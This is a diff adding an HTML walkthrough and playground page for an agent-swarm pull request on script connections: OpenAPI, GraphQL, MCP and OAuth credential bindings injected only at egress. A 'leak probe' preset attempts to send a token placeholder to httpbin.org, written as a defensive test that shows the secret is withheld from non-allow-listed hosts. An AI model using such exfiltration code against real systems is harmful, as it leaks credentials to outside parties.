@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Script Connections MVP — PR #934 walkthrough + playground</title>
+<style>
+  :root {
+    --bg: #0d1117; --panel: #161b22; --panel2: #1c2129; --border: #30363d;
+    --text: #e6edf3; --muted: #8b949e; --accent: #58a6ff; --green: #3fb950;
+    --red: #f85149; --yellow: #d29922; --purple: #bc8cff;
+  }
+  * { box-sizing: border-box; }
+  body { margin: 0; background: var(--bg); color: var(--text); font: 15px/1.6 system-ui, -apple-system, sans-serif; }
+  .wrap { max-width: 980px; margin: 0 auto; padding: 32px 24px 80px; }
+  h1 { font-size: 26px; margin: 0 0 4px; }
+  h2 { font-size: 19px; margin: 40px 0 12px; padding-top: 18px; border-top: 1px solid var(--border); }
+  h3 { font-size: 15px; margin: 18px 0 8px; color: var(--accent); }
+  .sub { color: var(--muted); margin-bottom: 24px; }
+  .pill { display: inline-block; padding: 1px 9px; border-radius: 20px; font-size: 12px; font-weight: 600; margin-right: 6px; }
+  .pill.ok { background: #12261e; color: var(--green); border: 1px solid #1f4230; }
+  .pill.info { background: #121d2f; color: var(--accent); border: 1px solid #1f3a5f; }
+  .pill.warn { background: #2a2312; color: var(--yellow); border: 1px solid #4d3d14; }
+  pre { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 14px 16px; overflow-x: auto; font: 12.5px/1.55 ui-monospace, "SF Mono", Menlo, monospace; margin: 8px 0; }
+  code { font-family: ui-monospace, "SF Mono", Menlo, monospace; font-size: 12.5px; background: var(--panel2); padding: 1px 5px; border-radius: 4px; }
+  pre code { background: none; padding: 0; }
+  .k { color: var(--purple); } .s { color: #a5d6ff; } .c { color: var(--muted); font-style: italic; } .fn { color: #d2a8ff; } .num { color: #79c0ff; }
+  .result { border-left: 3px solid var(--green); }
+  .result::before { content: "result"; display: block; color: var(--green); font-size: 10px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
+  .callout { background: var(--panel); border: 1px solid var(--border); border-left: 3px solid var(--yellow); border-radius: 8px; padding: 10px 16px; margin: 12px 0; font-size: 14px; }
+  .callout.red { border-left-color: var(--red); }
+  .callout.green { border-left-color: var(--green); }
+  details { margin: 8px 0; }
+  summary { cursor: pointer; color: var(--muted); font-size: 13px; }
+  table { border-collapse: collapse; width: 100%; font-size: 13px; margin: 10px 0; }
+  th, td { text-align: left; padding: 6px 12px; border-bottom: 1px solid var(--border); }
+  th { color: var(--muted); font-weight: 600; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+  /* playground */
+  .pg { background: var(--panel); border: 1px solid var(--border); border-radius: 10px; padding: 18px; margin-top: 14px; }
+  .row { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; margin-bottom: 10px; }
+  input[type=text] { background: var(--bg); color: var(--text); border: 1px solid var(--border); border-radius: 6px; padding: 6px 10px; font: 13px ui-monospace, Menlo, monospace; }
+  input.grow { flex: 1; min-width: 180px; }
+  button { background: #21262d; color: var(--text); border: 1px solid var(--border); border-radius: 6px; padding: 6px 14px; font-size: 13px; cursor: pointer; }
+  button:hover { border-color: var(--accent); }
+  button.primary { background: #1f6feb; border-color: #1f6feb; font-weight: 600; }
+  button.primary:hover { background: #388bfd; }
+  button.preset { font-size: 12px; padding: 4px 10px; color: var(--muted); }
+  button.preset:hover { color: var(--text); }
+  textarea { width: 100%; min-height: 180px; background: var(--bg); color: var(--text); border: 1px solid var(--border); border-radius: 8px; padding: 12px; font: 12.5px/1.55 ui-monospace, Menlo, monospace; resize: vertical; }
+  #out { min-height: 60px; white-space: pre-wrap; word-break: break-word; }
+  #out.err { border-left: 3px solid var(--red); }
+  .dot { width: 9px; height: 9px; border-radius: 50%; display: inline-block; background: var(--muted); margin-right: 5px; }
+  .dot.on { background: var(--green); } .dot.off { background: var(--red); }
+  .lbl { font-size: 12px; color: var(--muted); }
+  a { color: var(--accent); }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<h1>Script Connections MVP</h1>
+<div class="sub">
+  PR <a href="https://github.com/desplega-ai/agent-swarm/pull/934">#934</a> · <code>feat/script-connections-mvp</code> ·
+  register OpenAPI / GraphQL / MCP / OAuth-backed APIs once, use them from any swarm script via <code>ctx.api</code> / <code>ctx.mcp</code>.
+  This page documents an end-to-end walkthrough of the feature (real calls, real outputs) and includes a playground wired to your local server. Register the connections from the <a href="https://docs.agent-swarm.dev/docs/guides/script-connections">script connections guide</a> to make the presets work.
+</div>
+
+<span class="pill ok">✓ OpenAPI by spec URL</span>
+<span class="pill ok">✓ OAuth credential bindings</span>
+<span class="pill ok">✓ ctx.mcp server-side proxy</span>
+<span class="pill ok">✓ GraphQL connections</span>
+
+<h2>How it fits together</h2>
+<pre><code><span class="c">lead agent registers connections (MCP tools, lead-only):</span>
+  script-connections   → upsert-openapi | upsert-mcp | upsert-graphql | list | refresh | disable
+  credential-bindings  → upsert | oauth-app-upsert | oauth-authorize-url | list | disable
+  set-config           → store secrets (encrypted at rest w/ SECRETS_ENCRYPTION_KEY)
+
+<span class="c">any script then gets typed clients, credentials injected at egress only:</span>
+  ctx.api.&lt;slug&gt;.&lt;operationId&gt;(args)      <span class="c">// OpenAPI</span>
+  ctx.api.&lt;slug&gt;.graphql(query, vars)     <span class="c">// GraphQL</span>
+  ctx.mcp.&lt;slug&gt;.&lt;toolName&gt;(args)         <span class="c">// MCP (proxied through the API server)</span></code></pre>
+
+<h2>Step 1 — OpenAPI connection + credential binding</h2>
+<p>Registered the swarm's <em>own</em> REST API against itself: spec fetched from <code>/openapi.json</code> (117 routes → generated operations), secret stored encrypted, bound as a header.</p>
+<pre><code><span class="c">// 1. store the secret (encrypted at rest)</span>
+set-config { <span class="s">"key"</span>: <span class="s">"SWARM_SELF_KEY"</span>, <span class="s">"value"</span>: <span class="s">"123123"</span>, <span class="s">"isSecret"</span>: true, <span class="s">"scope"</span>: <span class="s">"global"</span> }
+
+<span class="c">// 2. register the connection + binding in one call</span>
+script-connections {
+  <span class="s">"action"</span>: <span class="s">"upsert-openapi"</span>,
+  <span class="s">"slug"</span>: <span class="s">"swarm"</span>,
+  <span class="s">"baseUrl"</span>: <span class="s">"http://localhost:3013"</span>,
+  <span class="s">"openapiSpecUrl"</span>: <span class="s">"http://localhost:3013/openapi.json"</span>,
+  <span class="s">"configKey"</span>: <span class="s">"SWARM_SELF_KEY"</span>,
+  <span class="s">"headerTemplate"</span>: <span class="s">"Authorization: Bearer [REDACTED:SWARM_SELF_KEY]"</span>,
+  <span class="s">"allowedHosts"</span>: [<span class="s">"localhost"</span>]
+}</code></pre>
+<pre><code><span class="k">export default async function</span>(args, ctx) {
+  <span class="k">const</span> res = <span class="k">await</span> ctx.api.swarm.<span class="fn">getApiAgents</span>();
+  <span class="k">return</span> { agentCount: res.agents.length, names: res.agents.map(a =&gt; a.name) };
+}</code></pre>
+<pre class="result"><code>{ "agentCount": 1, "names": ["demo-lead"] }</code></pre>
+<div class="callout">
+  <b>Gotcha found live:</b> the header template must contain the literal placeholder
+  <code>[REDACTED:KEY]</code>. I wrote <code>{{SWARM_SELF_KEY}}</code> first → the binding is
+  silently skipped → 401. Tool description doesn't show the format. (Also registered Petstore
+  by spec URL — worked, but petstore3.swagger.io itself was returning 500s that day.)
+</div>
+
+<h2>Step 2 — MCP connection (<code>ctx.mcp</code>)</h2>
+<p>Registered the swarm's own MCP endpoint as a server, then a connection with tool discovery: <b>117 tools</b> found, camelCased into methods. Calls are proxied <em>server-side</em> — the MCP server's auth headers never reach the script subprocess.</p>
+<pre><code>mcp-server-create { <span class="s">"name"</span>: <span class="s">"swarm-self-mcp"</span>, <span class="s">"transport"</span>: <span class="s">"http"</span>, <span class="s">"url"</span>: <span class="s">"http://localhost:3013/mcp"</span>, <span class="s">"headers"</span>: <span class="s">"{…auth…}"</span>, <span class="s">"scope"</span>: <span class="s">"swarm"</span> }
+script-connections { <span class="s">"action"</span>: <span class="s">"upsert-mcp"</span>, <span class="s">"slug"</span>: <span class="s">"swarmmcp"</span>, <span class="s">"mcpServerId"</span>: <span class="s">"5ae4fe03-…"</span> }</code></pre>
+<pre><code><span class="k">const</span> metrics = <span class="k">await</span> ctx.mcp.swarmmcp.<span class="fn">getMetrics</span>({});</code></pre>
+<pre class="result"><code>{ "content": [{ "type": "text", "text": "Swarm metrics: 1 tasks, 1 agents, …" }],
+  "structuredContent": { "tasks": { "total": 1 }, "agents": { "total": 1 }, "skills": { "total": 9 }, … } }</code></pre>
+<div class="callout">Known MVP gap: you get the raw MCP envelope (<code>content</code> + <code>structuredContent</code>) rather than an unwrapped result.</div>
+
+<h2>Step 3 — GraphQL connection</h2>
+<pre><code>script-connections { <span class="s">"action"</span>: <span class="s">"upsert-graphql"</span>, <span class="s">"slug"</span>: <span class="s">"countries"</span>, <span class="s">"baseUrl"</span>: <span class="s">"https://countries.trevorblades.com/"</span>, <span class="s">"allowedHosts"</span>: [<span class="s">"countries.trevorblades.com"</span>] }</code></pre>
+<pre><code><span class="k">const</span> data = <span class="k">await</span> ctx.api.countries.<span class="fn">graphql</span>(
+  <span class="s">"query($code: ID!) { country(code: $code) { name capital currency emoji languages { name } } }"</span>,
+  { code: <span class="s">"ES"</span> }
+);</code></pre>
+<pre class="result"><code>{ "country": { "name": "Spain", "capital": "Madrid", "currency": "EUR", "emoji": "🇪🇸",
+  "languages": ["Spanish", "Basque", "Catalan", "Galician", "Occitan"] } }</code></pre>
+<div class="callout">Signature is positional — <code>graphql(query, variables)</code>, not an options object. And <code>allowedHosts</code> is required even with no credential attached.</div>
+
+<h2>Step 4 — OAuth flow, end to end</h2>
+<p>Done against a local fake provider on <code>:4457</code> (identical code path to GitHub/Slack/etc — only the URLs differ).</p>
+<pre><code><span class="c">// 1. register the OAuth app (client id/secret from the provider's dev console)</span>
+credential-bindings { <span class="s">"action"</span>: <span class="s">"oauth-app-upsert"</span>, <span class="s">"provider"</span>: <span class="s">"fakehub"</span>, <span class="s">"clientId"</span>: <span class="s">"demo-client-id"</span>, <span class="s">"clientSecret"</span>: <span class="s">"…"</span>,
+  <span class="s">"authorizeUrl"</span>: <span class="s">"http://localhost:4457/authorize"</span>, <span class="s">"tokenUrl"</span>: <span class="s">"http://localhost:4457/token"</span>, <span class="s">"scopes"</span>: [<span class="s">"read"</span>] }
+
+<span class="c">// 2. get the URL to open in a browser — state + PKCE S256 generated by the swarm:</span>
+credential-bindings { <span class="s">"action"</span>: <span class="s">"oauth-authorize-url"</span>, <span class="s">"provider"</span>: <span class="s">"fakehub"</span> }
+<span class="c">→ http://localhost:4457/authorize?client_id=…&redirect_uri=…/api/oauth/fakehub/callback
+    &response_type=code&scope=read&state=cEUyFV…&code_challenge=nV2lUX…&code_challenge_method=S256</span>
+
+<span class="c">// 3. user authorizes → provider redirects to the swarm callback → code exchanged
+//    (client secret + PKCE verifier) → access+refresh token stored → "you can close this tab"</span>
+
+<span class="c">// 4. bind the token and attach to a connection</span>
+credential-bindings { <span class="s">"action"</span>: <span class="s">"upsert"</span>, <span class="s">"configKey"</span>: <span class="s">"FAKEHUB_TOKEN"</span>, <span class="s">"authKind"</span>: <span class="s">"oauth"</span>, <span class="s">"oauthProvider"</span>: <span class="s">"fakehub"</span>,
+  <span class="s">"allowedHosts"</span>: [<span class="s">"localhost"</span>], <span class="s">"headerTemplate"</span>: <span class="s">"Authorization: Bearer [REDACTED:FAKEHUB_TOKEN]"</span> }
+script-connections { <span class="s">"action"</span>: <span class="s">"upsert-openapi"</span>, <span class="s">"slug"</span>: <span class="s">"fakehub"</span>, <span class="s">"baseUrl"</span>: <span class="s">"http://localhost:4457"</span>, …, <span class="s">"credentialBindingId"</span>: <span class="s">"2d57ec26-…"</span> }</code></pre>
+<pre><code><span class="k">const</span> me = <span class="k">await</span> ctx.api.fakehub.<span class="fn">whoami</span>();</code></pre>
+<pre class="result"><code>{ "login": "taras-demo", "plan": "pro", "authedVia": "oauth" }</code></pre>
+
+<h3>Security proof</h3>
+<div class="callout green">
+  The provider's access log shows the <b>real</b> token arriving: <code>Bearer fakehub-access-token-e2e-1a2b3c4d</code>.<br>
+  An exfiltration probe sending the same placeholder to <b>httpbin.org</b> (not allow-listed) arrived as the literal string
+  <code>Bearer [REDACTED:FAKEHUB_TOKEN]</code>. Substitution happens only at fetch egress, only for allow-listed hosts —
+  the script process never holds the secret, and tokens echoed to stdout are scrubbed.
+</div>
+
+<h2>Playground</h2>
+<p class="lbl">Talks to your local server via <code>POST /api/scripts/run</code>. Server must be running from the worktree (<code>localhost:3013</code>); the fakehub provider on <code>:4457</code> is needed only for the OAuth preset. Open this file in a regular browser tab.</p>
+
+<div class="pg">
+  <div class="row">
+    <span class="lbl">server</span> <input type="text" id="server" value="http://localhost:3013" size="22">
+    <span class="lbl">api key</span> <input type="text" id="apikey" value="123123" size="8">
+    <span class="lbl">agent id</span> <input type="text" id="agent" class="grow" placeholder="lead agent id" value="">
+    <button onclick="ping()"><span class="dot" id="dot"></span>check</button>
+  </div>
+  <div class="row" id="presets"><span class="lbl">presets:</span></div>
+  <textarea id="src" spellcheck="false"></textarea>
+  <div class="row" style="margin-top:10px">
+    <button class="primary" onclick="run()" id="runbtn">▶ Run script</button>
+    <span class="lbl" id="meta"></span>
+  </div>
+  <pre id="out"><code>—</code></pre>
+
+  <h3>Registered connections <button class="preset" onclick="loadConnections()">refresh</button></h3>
+  <table id="conns"><thead><tr><th>slug</th><th>kind</th><th>base url</th><th>credential</th><th>enabled</th></tr></thead><tbody></tbody></table>
+</div>
+
+<h2>Follow-ups spotted during the walkthrough</h2>
+<table>
+<tr><th>What</th><th>Why</th></tr>
+<tr><td>Placeholder syntax undocumented</td><td><code>{{KEY}}</code> → silent 401; tool description should show <code>[REDACTED:KEY]</code> or auto-normalize</td></tr>
+<tr><td><code>upsert-graphql</code> requires <code>allowedHosts</code></td><td>Even for credential-less public APIs</td></tr>
+<tr><td>Raw MCP envelope from <code>ctx.mcp</code></td><td>Scripts must unwrap <code>structuredContent</code> themselves</td></tr>
+<tr><td>oauth_tokens plaintext at rest</td><td>Known MVP gap, <code>TODO(secrets-cipher)</code></td></tr>
+</table>
+
+</div>
+<script>
+const $ = id => document.getElementById(id);
+const PRESETS = {
+  "introspect ctx": `export default async function(args, ctx) {
+  return {
+    api: Object.keys(ctx.api ?? {}),
+    mcp: Object.keys(ctx.mcp ?? {}),
+  };
+}`,
+  "swarm API (openapi)": `export default async function(args, ctx) {
+  // calls the swarm's own REST API; bearer injected at egress via [REDACTED:SWARM_SELF_KEY]
+  const res = await ctx.api.swarm.getApiAgents();
+  return { agentCount: res.agents.length, names: res.agents.map(a => a.name) };
+}`,
+  "countries (graphql)": `export default async function(args, ctx) {
+  const data = await ctx.api.countries.graphql(
+    "query($code: ID!) { country(code: $code) { name capital currency emoji languages { name } } }",
+    { code: "ES" }
+  );
+  return data;
+}`,
+  "swarm metrics (mcp)": `export default async function(args, ctx) {
+  // proxied server-side: POST /api/script-connections/{id}/mcp-call
+  const res = await ctx.mcp.swarmmcp.getMetrics({});
+  return res.structuredContent ?? res;
+}`,
+  "fakehub whoami (oauth)": `export default async function(args, ctx) {
+  // OAuth access token resolved from oauth_tokens, refreshed if expiring,
+  // substituted only at egress to allow-listed hosts
+  const me = await ctx.api.fakehub.whoami();
+  return me;
+}`,
+  "leak probe": `export default async function(args, ctx) {
+  // try to exfiltrate the oauth placeholder to a NON-allow-listed host
+  const probe = "Bearer [REDACTED:FAKEHUB_TOKEN]";
+  const r = await fetch("https://httpbin.org/post", { method: "POST", headers: { authorization: probe }, body: "x" });
+  const j = await r.json();
+  return { whatHttpbinReceived: j.headers?.Authorization ?? null };
+}`,
+};
+
+const presetsRow = $("presets");
+for (const name of Object.keys(PRESETS)) {
+  const b = document.createElement("button");
+  b.className = "preset"; b.textContent = name;
+  b.onclick = () => { $("src").value = PRESETS[name]; };
+  presetsRow.appendChild(b);
+}
+$("src").value = PRESETS["introspect ctx"];
+
+const headers = () => ({
+  "Authorization": "Bearer " + $("apikey").value.trim(),
+  "X-Agent-ID": $("agent").value.trim(),
+  "Content-Type": "application/json",
+});
+
+async function ping() {
+  const dot = $("dot");
+  try {
+    const r = await fetch($("server").value + "/api/agents", { headers: headers() });
+    dot.className = "dot " + (r.ok ? "on" : "off");
+    if (r.ok) loadConnections();
+  } catch { dot.className = "dot off"; }
+}
+
+async function run() {
+  const out = $("out"), btn = $("runbtn"), meta = $("meta");
+  btn.disabled = true; meta.textContent = "running…"; out.className = "";
+  out.innerHTML = "<code>…</code>";
+  const t0 = performance.now();
+  try {
+    const r = await fetch($("server").value + "/api/scripts/run", {
+      method: "POST", headers: headers(),
+      body: JSON.stringify({ source: $("src").value, intent: "playground run" }),
+    });
+    const j = await r.json();
+    const ms = Math.round(performance.now() - t0);
+    const failed = !r.ok || j.exitCode !== 0 || j.error;
+    out.className = failed ? "err" : "";
+    const view = {
+      result: j.result ?? null,
+      ...(j.stdout ? { stdout: j.stdout } : {}),
+      ...(j.stderr ? { stderr: j.stderr } : {}),
+      ...(j.error ? { error: j.error } : {}),
+      exitCode: j.exitCode,
+    };
+    out.innerHTML = ""; out.appendChild(Object.assign(document.createElement("code"), { textContent: JSON.stringify(view, null, 2) }));
+    meta.textContent = `HTTP ${r.status} · script ${j.durationMs ?? "?"}ms · round-trip ${ms}ms`;
+  } catch (e) {
+    out.className = "err";
+    out.innerHTML = ""; out.appendChild(Object.assign(document.createElement("code"), { textContent: "fetch failed: " + e.message + "\n\nIs the server running on " + $("server").value + " ?" }));
+    meta.textContent = "";
+  } finally { btn.disabled = false; }
+}
+
+async function loadConnections() {
+  const tbody = document.querySelector("#conns tbody");
+  try {
+    const r = await fetch($("server").value + "/api/db-query", {
+      method: "POST", headers: headers(),
+      body: JSON.stringify({ query: "SELECT slug, kind, base_url, credential_binding_id IS NOT NULL, enabled FROM script_connections ORDER BY slug" }),
+    });
+    const j = await r.json();
+    tbody.innerHTML = "";
+    for (const row of j.rows ?? []) {
+      const tr = document.createElement("tr");
+      const cells = [row[0], row[1], row[2] ?? "—", row[3] ? "🔑 bound" : "—", row[4] ? "✓" : "✗"];
+      for (const c of cells) { const td = document.createElement("td"); td.textContent = String(c); tr.appendChild(td); }
+      tbody.appendChild(tr);
+    }
+  } catch { tbody.innerHTML = "<tr><td colspan=5>failed to load</td></tr>"; }
+}
+
+ping();
+</script>
+</body>
+</html>
